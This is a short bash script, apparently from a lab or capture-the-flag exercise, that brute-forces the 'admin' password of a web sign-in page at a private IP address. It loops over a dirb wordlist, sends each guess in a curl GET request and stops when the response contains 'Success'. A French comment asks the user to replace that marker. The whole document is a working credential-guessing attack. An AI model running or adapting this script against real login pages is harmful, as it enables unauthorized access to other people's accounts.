#!/bin/bash

url="http://172.18.161.186/?page=signin"
username="admin"
wordlist="/usr/share/dirb/wordlists/common.txt"

while read password; do
    echo "Testing password: $password"
    response=$(curl -s "${url}&username=${username}&password=${password}&Login=Login")
    
    # Vérifie une réponse indiquant un succès (remplace "Success" par l'indication réelle)
    if echo "$response" | grep -q "Success"; then
        echo "Password found: $password"
        break
    fi
done < "$wordlist"
